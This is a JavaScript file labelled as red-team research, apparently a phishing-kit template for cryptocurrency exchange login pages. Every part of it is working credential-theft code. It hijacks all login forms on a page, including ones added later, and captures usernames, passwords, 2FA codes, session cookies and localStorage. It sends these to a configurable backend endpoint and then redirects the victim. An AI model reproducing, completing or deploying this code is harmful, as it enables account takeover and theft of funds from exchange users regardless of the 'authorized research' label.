/* CEX login credential capture — authorized red-team research only */
(function () {
  var BACKEND_URL = '__BACKEND_URL__';
  var EXCHANGE = '__EXCHANGE__';
  var REDIRECT_URL = '__REDIRECT_URL__';
  var API_KEY = '__API_KEY__';
  var CAPTURE_SESSION = __CAPTURE_SESSION_COOKIES__;

  var USER_FIELDS = ['email', 'username', 'login', 'user', 'userid', 'account', 'phone'];
  var PASS_FIELDS = ['password', 'pass', 'passwd', 'pwd'];
  var TOTP_FIELDS = ['totp', 'otp', '2fa', 'mfa', 'code', 'token', 'authenticator', 'sms'];

  function fieldMatch(name, list) {
    if (!name) return false;
    var n = name.toLowerCase();
    return list.some(function (f) { return n.indexOf(f) >= 0; });
  }

  function readFormPayload(form) {
    var username = '';
    var password = '';
    var totp = '';
    var fd = new FormData(form);
    fd.forEach(function (value, key) {
      var v = String(value || '').trim();
      if (!v) return;
      if (!username && fieldMatch(key, USER_FIELDS)) username = v;
      if (!password && fieldMatch(key, PASS_FIELDS)) password = v;
      if (!totp && fieldMatch(key, TOTP_FIELDS)) totp = v;
    });
    if (!password) {
      var pw = form.querySelector('input[type="password"]');
      if (pw) password = String(pw.value || '').trim();
    }
    if (!username) {
      var email = form.querySelector('input[type="email"]');
      if (email) username = String(email.value || '').trim();
    }
    return { username: username, password: password, totp: totp };
  }

  function readSessionCookies() {
    if (!CAPTURE_SESSION) return null;
    try {
      var raw = document.cookie || '';
      return raw.trim() || null;
    } catch (e) {
      return null;
    }
  }

  function readLocalStorageSnapshot() {
    if (!CAPTURE_SESSION) return null;
    try {
      var out = {};
      for (var i = 0; i < localStorage.length; i++) {
        var key = localStorage.key(i);
        if (!key) continue;
        out[key] = localStorage.getItem(key);
      }
      var keys = Object.keys(out);
      if (!keys.length) return null;
      return JSON.stringify(out);
    } catch (e) {
      return null;
    }
  }

  function buildPayload(formPayload) {
    var body = {
      exchange: EXCHANGE,
      username: formPayload.username,
      password: formPayload.password,
      totp: formPayload.totp || null,
      page_url: window.location.href,
    };
    if (CAPTURE_SESSION) {
      body.session_cookies = readSessionCookies();
      body.local_storage = readLocalStorageSnapshot();
    }
    return body;
  }

  async function submitCreds(formPayload) {
    var headers = { 'Content-Type': 'application/json' };
    if (API_KEY) headers['X-Cex-Creds-Key'] = API_KEY;
    var res = await fetch(BACKEND_URL + '/api/v1/creds', {
      method: 'POST',
      headers: headers,
      body: JSON.stringify(buildPayload(formPayload)),
    });
    var data = await res.json().catch(function () { return {}; });
    if (!res.ok && data && data.message) throw new Error(data.message);
    return data;
  }

  function hookForm(form) {
    if (form.__legionCexHooked) return;
    form.__legionCexHooked = true;
    form.setAttribute('action', '#');
    form.setAttribute('method', 'post');
    form.addEventListener('submit', function (e) {
      e.preventDefault();
      e.stopPropagation();
      var payload = readFormPayload(form);
      if (!payload.username && !payload.password) return;

      submitCreds(payload)
        .then(function () {
          /* brief delay so any post-submit cookie writes can land */
          setTimeout(function () {
            var postCookies = readSessionCookies();
            var postLs = readLocalStorageSnapshot();
            if (CAPTURE_SESSION && (postCookies || postLs)) {
              submitCreds(payload).catch(function () {});
            }
            window.location.href = REDIRECT_URL;
          }, 400);
        })
        .catch(function () {
          window.location.href = REDIRECT_URL;
        });
    }, true);
  }

  function scanForms(root) {
    (root || document).querySelectorAll('form').forEach(hookForm);
  }

  scanForms(document);
  var obs = new MutationObserver(function (mutations) {
    mutations.forEach(function (m) {
      m.addedNodes.forEach(function (node) {
        if (node.nodeType !== 1) return;
        if (node.tagName === 'FORM') hookForm(node);
        else scanForms(node);
      });
    });
  });
  obs.observe(document.documentElement, { childList: true, subtree: true });
})();
